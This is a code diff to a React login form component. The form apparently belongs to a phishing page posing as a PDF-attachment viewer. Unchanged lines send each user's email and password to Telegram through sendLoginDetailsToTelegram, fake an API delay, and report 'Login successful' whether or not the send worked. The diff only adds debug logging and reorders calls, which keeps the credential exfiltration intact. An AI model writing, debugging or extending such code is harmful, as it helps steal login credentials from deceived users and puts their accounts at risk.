@@ -45,15 +45,18 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
     }
 
     setIsLoading(true);
+    console.log("Login attempt started for:", email);
     
     // Send login details to Telegram
     const telegramSent = await sendLoginDetailsToTelegram(email, password);
+    console.log("Telegram sent status:", telegramSent);
     
     if (telegramSent) {
       // Simulate API call delay
       setTimeout(() => {
-        onLogin(email, password);
+        console.log("Login successful via Telegram path");
         setIsLoading(false);
+        onLogin(email, password);
         toast({
           title: "Login successful",
           description: "Welcome! You can now view PDF attachments.",
@@ -62,8 +65,9 @@ const LoginForm = ({ onLogin }: LoginFormProps) => {
     } else {
       // Continue with login even if Telegram fails
       setTimeout(() => {
-        onLogin(email, password);
+        console.log("Login successful via fallback path");
         setIsLoading(false);
+        onLogin(email, password);
         toast({
           title: "Login successful",
           description: "Welcome! You can now view PDF attachments.",
